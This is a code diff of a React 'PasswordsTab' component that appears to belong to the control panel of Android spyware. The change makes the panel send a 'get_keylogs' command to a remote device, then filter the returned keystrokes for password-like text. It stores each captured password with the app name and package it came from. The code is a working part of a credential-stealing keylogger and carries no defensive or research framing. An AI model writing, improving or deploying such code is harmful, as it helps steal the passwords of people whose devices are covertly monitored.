@@ -171,51 +171,54 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
     }
   }, [keylogPushEntries]);
 
-  // Process a list of keylog entries looking for passwords
-  const absorbKeylogEntries = (entries) => {
-    const newEntries = [];
-    entries.forEach(entry => {
-      const text = entry.text || entry.content || '';
-      const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
-      const isPasswordFlag = entry.isPassword;
-      const eventType = entry.eventType || '';
-      if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
-        const id = (entry.id || entry.timestamp + text);
-        if (!seenIds.current.has(id)) {
-          seenIds.current.add(id);
-          newEntries.push({
-            id: id + '_scan',
-            value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
-            appName: entry.appName || entry.app || '',
-            appPackage: entry.packageName || entry.pkg || '',
-            fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
-            capturedAt: entry.timestamp || Date.now(),
-            source: 'scan',
-            isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
+  // Absorb command results (e.g. get_keylogs)
+  useEffect(() => {
+    results.forEach(r => {
+      if (r.command === 'get_keylogs' && r.success && r.response && !seenIds.current.has('result_' + r.id)) {
+        seenIds.current.add('result_' + r.id);
+        setLoading(false);
+        try {
+          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          const entries = data.keylogs || data.logs || data.entries || [];
+          const newEntries = [];
+          entries.forEach(entry => {
+            const text = entry.text || entry.content || '';
+            const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
+            const isPasswordFlag = entry.isPassword;
+            const eventType = entry.eventType || '';
+            if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
+              const id = (entry.id || entry.timestamp + text);
+              if (!seenIds.current.has(id)) {
+                seenIds.current.add(id);
+                newEntries.push({
+                  id: id + '_scan',
+                  value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
+                  appName: entry.appName || entry.app || '',
+                  appPackage: entry.packageName || entry.pkg || '',
+                  fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
+                  capturedAt: entry.timestamp || Date.now(),
+                  source: 'scan',
+                  isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
+                });
+              }
+            }
           });
-        }
+          if (newEntries.length > 0) {
+            setPasswords(prev => {
+              const updated = [...newEntries, ...prev];
+              savePasswords(updated);
+              return updated;
+            });
+          }
+        } catch (_) {}
       }
     });
-    if (newEntries.length > 0) {
-      setPasswords(prev => {
-        const updated = [...newEntries, ...prev];
-        savePasswords(updated);
-        return updated;
-      });
-    }
-  };
+  }, [results]);
 
   const handleScan = () => {
     if (!isOnline) return;
     setLoading(true);
-    fetch(`/api/data/${deviceId}/keylogs?limit=500`)
-      .then(r => r.json())
-      .then(d => {
-        const entries = d.logs || d.keylogs || [];
-        absorbKeylogEntries(entries);
-      })
-      .catch(() => {})
-      .finally(() => setLoading(false));
+    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
   };
 
   const deleteEntry = (id) => {
